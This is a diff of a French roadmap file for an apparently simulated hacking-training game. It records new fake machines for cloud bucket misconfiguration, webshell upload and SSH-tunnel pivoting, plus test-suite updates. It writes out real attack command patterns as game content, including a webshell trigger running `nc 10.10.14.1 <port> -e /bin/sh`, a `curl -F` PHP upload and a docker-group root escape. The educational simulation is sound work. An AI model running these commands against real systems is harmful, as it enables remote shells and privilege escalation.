@@ -17,21 +17,21 @@ Vue synthétique de ce qui reste ouvert et vaudrait le coup d'être attaqué ens
 plus de ce qui vient d'être livré dans les dernières passes (`vim`, `nc` bannière + écoute,
 reverse shell manuel sur MERIDIAN, `validateMachines` en garde-fou de schéma) :
 
-1. **Machines en pivot** (Phase 2) — chaînage multi-hop, forte valeur pédagogique. Le
-   garde-fou de schéma (`validateMachines`) est déjà en place pour sécuriser l'ajout d'une
-   machine supplémentaire de ce type.
-2. **Extraction JSON pure des machines** (Phase 3) — le schéma de validation existe déjà ;
+1. **Extraction JSON pure des machines** (Phase 3) — le schéma de validation existe déjà ;
    il reste à sérialiser proprement les champs regex du privesc pour sortir `machines.js`
    en fichier `.json` séparé.
-3. **`vrai parser shell`** (Phase 3) — dette technique qui limite déjà certains scénarios
+2. **`vrai parser shell`** (Phase 3) — dette technique qui limite déjà certains scénarios
    (pas de citations imbriquées, pas de `$(...)`) ; utile avant d'enrichir encore les
    familles de vulnérabilités web.
-4. **i18n FR/EN** (Phase 3) — gros chantier transverse, à faire une fois le contenu FR
+3. **i18n FR/EN** (Phase 3) — gros chantier transverse, à faire une fois le contenu FR
    stabilisé (sinon double la charge de maintenance à chaque nouvelle machine).
 
-> ✅ Livré depuis la dernière revue : **`nc`/reverse shell généralisé** — le schéma
-> `machine.altAccess` (`{ path, injectRegex, user }`) parse l'IP/port du callback depuis le
-> payload et est désormais réutilisé sur MERIDIAN **et** PHANTOM (voir Phase 2).
+> ✅ **Phase 2 entièrement terminée** : les 3 derniers items sont livrés — machine cloud
+> mal configurée (**STRATUS**, commande `cloudctl`), chapitre upload de webshell (**NEXUS**,
+> `curl -F` + reverse shell), et machines en pivot (**CITADEL**, hôte interne joignable
+> uniquement via un tunnel `ssh -L` à travers NEXUS rooté). 8 → **11 machines**.
+> Précédemment : **`nc`/reverse shell généralisé** (`machine.altAccess`, réutilisé sur
+> MERIDIAN, PHANTOM **et** NEXUS) et le **solveur automatique** `tools/solve.js`.
 
 ---
 
@@ -64,9 +64,9 @@ reverse shell manuel sur MERIDIAN, `validateMachines` en garde-fou de schéma) :
 ## 📚 Phase 2 — Contenu (plus de machines, plus de variété)
 
 - [x] **Monter à 8-10 machines** avec une vraie courbe de difficulté (Facile → Moyen →
-      Difficile → Insane) — 8/8-10 avec VORTEX (IDOR API), MERIDIAN (LFI config leak) et
-      AXIOM (Insane, groupe `docker` équivalent root). *Reste ouvert* : 1-2 machines de plus
-      pour viser le haut de la fourchette.
+      Difficile → Insane) — objectif dépassé : **11 machines**, avec en plus STRATUS (cloud
+      public), NEXUS (upload de webshell) et CITADEL (pivot interne). L'ordre du tableau reste
+      la courbe de déblocage, AXIOM (Insane) demeure le final narratif.
 - [x] **Nouvelles familles de vulnérabilités**, toujours simulées (pas de vrai service qui
       tourne) :
       - [x] Web : faux login vulnérable à une injection SQL simplifiée (`curl -d`, bypass
@@ -77,8 +77,14 @@ reverse shell manuel sur MERIDIAN, `validateMachines` en garde-fou de schéma) :
       - [x] Un mini scénario conteneur simulé — commande `docker ps` en dur (pas de vrai
         Docker) + privesc via appartenance au groupe `docker` (`docker run -v /:/mnt --rm -it
         alpine chroot /mnt sh`) → machine **AXIOM**
-- [ ] **Machines en pivot** — rooter la machine 1 donne accès réseau à une machine 2
-      "interne", via un faux tunnel SSH (`ssh -L`) simulé — chaînes d'attaque multi-hop
+- [x] **Machines en pivot** — livré via **CITADEL** (`internal: true`, `pivot: { via, pivotIp }`).
+      L'hôte interne (172.16.20.10) n'est pas routable directement : `nmap`/`ssh`/`curl` sur son IP
+      renvoient "hôte interne, non routable". Il faut d'abord rooter le pivot (**NEXUS**), y lire
+      `/root/infra_notes.txt` (IP interne + creds), puis ouvrir un tunnel simulé
+      `ssh -L <lport>:172.16.20.10:22 root@<nexus>` — le moteur exige que le pivot soit rooté et
+      pose `SESSION.tunnel`, ce qui rend l'hôte interne joignable. Chaîne d'attaque multi-hop
+      complète (NEXUS → CITADEL). Testé dans `tests/run.js` (injoignable sans tunnel, tunnel refusé
+      si pivot non rooté, exploitation complète après pivot) et rejoué par `tools/solve.js` (deps).
 - [x] **Mode "Insane / sans indices"** — commande `insane on`, pour les joueurs qui veulent un
       run tendu dès le départ : `hint`/`chint` refusent, score multiplié par 1.5 sur toute la
       partie. Verrouillé à une sauvegarde neuve (score à 0, rien de commencé) pour éviter toute
@@ -130,23 +136,29 @@ reverse shell manuel sur MERIDIAN, `validateMachines` en garde-fou de schéma) :
       prouver la généricité. Testé dans `tests/run.js` (port variable 9001, rejet d'une mauvaise
       IP de callback, LFI normale non confondue avec une injection, exploitation complète de
       PHANTOM par ce chemin).
-- [ ] **Chapitre "upload de webshell"** *(nouvelle idée)* — un faux formulaire d'upload mal
-      filtré (`curl -F` simulé) qui accepte un fichier déguisé, exécuté ensuite via une
-      requête vers son chemin — bon candidat pour un second cas d'usage du reverse shell
-      généralisé ci-dessus (le webshell "ouvre" une connexion vers le port que le joueur
-      écoute avec `nc -lvnp`)
-- [ ] **Machine "mauvaise configuration cloud"** *(nouvelle idée)* — simulateur minimal d'un
-      bucket de stockage mal configuré (accès public en lecture/écriture) exposé via une
-      fausse CLI (`cloudctl ls`/`cloudctl get`/`cloudctl cp`), pour couvrir une classe de
-      vulnérabilité très courante sans avoir besoin d'un vrai SDK cloud
+- [x] **Chapitre "upload de webshell"** — livré via **NEXUS**. Formulaire mal filtré
+      (`machine.upload = { formPath, filenameRegex, webshellPath, user }`) : `curl -F "file=@shell.php"`
+      accepte un `.php` déguisé (le filtre ne regarde que l'extension) et révèle le chemin du
+      webshell. Ce webshell exécute son paramètre `cmd` → réutilise le mécanisme `altAccess`
+      généralisé (avec le drapeau `requiresUpload: true` qui renvoie un 404 tant que rien n'a été
+      uploadé) : en écoutant `nc -lvnp <port>` puis en déclenchant
+      `curl ".../uploads/sh.php?cmd=nc 10.10.14.1 <port> -e /bin/sh"`, le joueur obtient un shell
+      www-data. Second cas d'usage concret du reverse shell généralisé. Testé (404 sans upload,
+      fichier non-php refusé, upload + reverse shell OK).
+- [x] **Machine "mauvaise configuration cloud"** — livré via **STRATUS** + la commande `cloudctl`
+      (fausse CLI de stockage objet, 100% en dur, aucun SDK). `cloudctl ls` liste les buckets,
+      `cloudctl ls s3://<bucket>` liste le contenu (AccessDenied si privé), `cloudctl get s3://.../<clé>`
+      télécharge un objet, `cloudctl cp` téléverse (si le bucket autorise l'écriture publique). Le
+      bucket `stratus-prod-backups` est public en lecture et fuite un `deploy.env` avec des creds SSH
+      → accès. Testé (bucket public listé/lu, bucket privé refusé en ls et get).
 
 ## 🔧 Phase 3 — Technique / fiabilité
 
 - [x] **Suite de tests unitaires du moteur** — `tests/run.js` (Node, zéro dépendance) : parsing
-      et pipes, exploit complet des 8 machines (recon → accès → privesc → 2 flags), cohérence
+      et pipes, exploit complet des 11 machines (recon → accès → privesc → 2 flags), cohérence
       du score, remboursement de `reset`, résolution des défis Jeopardy, mode Insane, éditeur
       `vim` (création/édition/`:q!`, alternative à `echo >>` pour le privesc cron), bannière
-      `nc`. 108 assertions au total. Lancer avec `node tests/run.js`. A déjà détecté plusieurs
+      `nc`, cloud (`cloudctl`), upload de webshell et pivot `ssh -L`. 167 assertions au total. Lancer avec `node tests/run.js`. A déjà détecté plusieurs
       erreurs de séquence de commandes pendant son écriture — utile.
 - [ ] **Vrai parser shell** — gestion propre des guillemets imbriqués, variables `$VAR`,
       substitution de commande `$(...)`, redirections multiples (`2>`, `&>`) — le parseur
@@ -243,7 +255,7 @@ reverse shell manuel sur MERIDIAN, `validateMachines` en garde-fou de schéma) :
 
 ## 🌀 Phase 6 — Encore plus loin (vague 2)
 
-- [x] **Lore transversal** — un fil narratif léger reliant les 8 machines (une auditrice interne,
+- [x] **Lore transversal** — un fil narratif léger reliant les machines (une auditrice interne,
       R. Kade, disparaît en pleine investigation d'une fraude chez "Solenne Holdings" ; un fichier
       `note_interne.txt` par machine avance discrètement l'histoire, jusqu'à un journal final sur
       AXIOM). Aucun impact sur le gameplay — pur easter egg dans les données de `machines.js`.
